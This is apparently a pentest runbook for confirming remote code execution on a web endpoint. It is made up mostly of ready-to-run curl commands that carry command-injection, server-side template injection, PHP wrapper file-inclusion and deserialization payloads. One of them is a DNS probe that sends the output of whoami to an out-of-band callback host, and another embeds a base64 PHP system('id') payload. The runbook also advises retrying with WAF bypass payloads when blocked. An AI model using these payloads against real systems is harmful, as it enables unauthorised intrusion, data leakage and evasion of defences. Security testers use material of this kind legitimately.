# RCE Probe Runbook

## Purpose
Low-impact probing to confirm suspicion of RCE without triggering destructive actions or WAF blocks.

## Variables
- `$TARGET_URL` — endpoint suspected vulnerable
- `$VULN_PARAM` — the parameter name suspected injectable
- `$OUTDIR` — output directory
- `$EVIDENCE_DIR` — evidence subdirectory

## Workflow A — Command Injection Probing

### A1. Time-based blind probe (safe, no output needed)
```bash
curl -sk -w "\nTime: %{time_total}s\n" "$TARGET_URL?$VULN_PARAM=sleep+5" -o "$OUTDIR/rce-probe-time1.txt" && curl -sk -w "\nTime: %{time_total}s\n" "$TARGET_URL?$VULN_PARAM=sleep+0" -o "$OUTDIR/rce-probe-time2.txt"
```

### A2. Arithmetic probe (inlines result in response)
```bash
curl -sk "$TARGET_URL?$VULN_PARAM=\$(expr+1337+%2B+1)" -o "$OUTDIR/rce-probe-arith.txt" && grep -E '1338' "$OUTDIR/rce-probe-arith.txt" && echo "CMD_INJ_ARITH: $TARGET_URL?$VULN_PARAM" >> "$OUTDIR/rce-probe-hit.txt"
```

### A3. DNS-based blind probe (requires interactsh or burp collaborator)
```bash
curl -sk "$TARGET_URL?$VULN_PARAM=nslookup+\$(whoami).YOURID.oastify.com" -o "$OUTDIR/rce-probe-dns.txt"
```

### A4. Multiple separator variants
```bash
for sep in ';' '|' '||' '&' '&&' '$(' ''\''' backtick='`'; do
  curl -sk "$TARGET_URL?$VULN_PARAM=${sep}id" -o "$OUTDIR/rce-probe-$sep.txt" && grep -qE 'uid=|gid=' "$OUTDIR/rce-probe-$sep.txt" && echo "SEPARATOR: $sep VULN: $TARGET_URL?$VULN_PARAM" >> "$OUTDIR/rce-probe-hit.txt"
done
```

## Workflow B — SSTI Probing

### B1. Multi-engine polyglot
```bash
curl -sk "$TARGET_URL?$VULN_PARAM=\${{<%[%'\"}}%\.}}" -o "$OUTDIR/rce-ssti-polyglot.txt"
```

### B2. Engine-specific probes
```bash
curl -sk "$TARGET_URL?$VULN_PARAM={{config}}" -o "$OUTDIR/rce-ssti-jinja.txt"
curl -sk "$TARGET_URL?$VULN_PARAM=\${7*7}" -o "$OUTDIR/rce-ssti-freemarker.txt"
curl -sk "$TARGET_URL?$VULN_PARAM={{7*'7'}}" -o "$OUTDIR/rce-ssti-twig.txt"
curl -sk "$TARGET_URL?$VULN_PARAM=<%=+7*7+%>" -o "$OUTDIR/rce-ssti-erb.txt"
```

### B3. Check each output for SSTI evaluation
```bash
for f in "$OUTDIR"/rce-ssti-*.txt; do
  grep -qE '49|7777777|<Config |class java' "$f" && echo "SSTI: $(basename "$f") -> $TARGET_URL?$VULN_PARAM" >> "$OUTDIR/rce-ssti-hit.txt"
done
```

## Workflow C — LFI Probing

### C1. PHP wrapper probes
```bash
curl -sk "$TARGET_URL?$VULN_PARAM=php://filter/convert.base64-encode/resource=index.php" -o "$OUTDIR/rce-lfi-b64.txt"
grep -qE 'PD9waHA|PD8=|^[A-Za-z0-9+/=]{20,}$' "$OUTDIR/rce-lfi-b64.txt" && echo "LFI_WRAPPER: php://filter -> $TARGET_URL?$VULN_PARAM" >> "$OUTDIR/rce-probe-hit.txt"
```

### C2. expect wrapper probe (if PHP + expect enabled)
```bash
curl -sk "$TARGET_URL?$VULN_PARAM=expect://id" -o "$OUTDIR/rce-lfi-expect.txt"
grep -qE 'uid=' "$OUTDIR/rce-lfi-expect.txt" && echo "LFI_EXPECT_CMD: $TARGET_URL?$VULN_PARAM" >> "$OUTDIR/rce-probe-hit.txt"
```

### C3. data wrapper probe
```bash
curl -sk "$TARGET_URL?$VULN_PARAM=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==" -o "$OUTDIR/rce-lfi-data.txt"
grep -qE 'uid=' "$OUTDIR/rce-lfi-data.txt" && echo "LFI_DATA_CMD: $TARGET_URL?$VULN_PARAM" >> "$OUTDIR/rce-probe-hit.txt"
```

## Workflow D — Deserialization Probing

### D1. Find serialized data in requests
```bash
gau "$TARGET_URL" | grep -iE 'serialize|rO0|O:[0-9]|pickle|marshal' | sort -u > "$OUTDIR/rce-deser-urls.txt"
```

### D2. Java deserialization probe (ysoserial DNS callback)
```bash
curl -sk "$TARGET_URL" -b "session=rO0ABXNy..." -o "$OUTDIR/rce-deser-probe.txt"
```

### D3. Python pickle probe
```bash
python3 -c "import pickle,base64; print(base64.b64encode(pickle.dumps('test')))" > "$OUTDIR/rce-pickle-payload.txt"
```

## Detection Signals
| Signal | Confidence | Action |
|---|---|---|
| Time diff > 3s on sleep probe | Medium | Confirm with arithmetic probe |
| `1338` appears in response | High | Go to verify |
| `uid=` / `gid=` / `uid=0` appears | Very High | Go to verify |
| `49` or `7777777` appears | High | Identify engine, go to verify |
| `<Config {...}>` appears | High | SSTI Jinja2 confirmed |

## False Positive Patterns
- `49` appears in error message text (not evaluation): check context
- Time-based probe delayed by network latency: always compare with `sleep 0` baseline
- Content-type header suggesting HTML but arithmetic result is coincidental text: verify with a second distinct arithmetic payload

## Next Routing
- Probe hit confirmed → `runbooks/03-verify.md`
- Probe hit but WAF/IPS blocks → load bypass payloads, retry with encoding
- No hit on any probe → return to discovery for additional param enumeration or stop